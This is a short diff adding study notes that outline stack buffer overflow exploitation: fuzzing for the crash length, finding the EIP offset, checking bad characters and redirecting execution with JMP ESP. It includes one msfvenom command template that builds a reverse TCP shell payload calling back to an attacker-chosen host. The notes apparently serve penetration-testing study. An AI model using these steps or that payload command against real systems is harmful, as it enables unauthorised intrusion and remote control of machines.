@@ -1,0 +1,16 @@
+*Buffers overflow*
+Buffers overflow
+Exploitation
+    Determine length of overflow trigger w/ binary search "A"x1000
+    Determine exact EIP with pattern_create.rb & pattern_offset.rb
+    Determine badchars to make sure all of your payload is getting through
+    Develop exploit
+    Is the payload right at ESP
+    JMP ESP
+    Is the payload before ESP
+    sub ESP, 200 and then JMP ESP
+    or
+    call [ESP-200]
+    msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename
+    Make sure it fits your payload length above
+    Gain shell, local priv esc or rooted already?
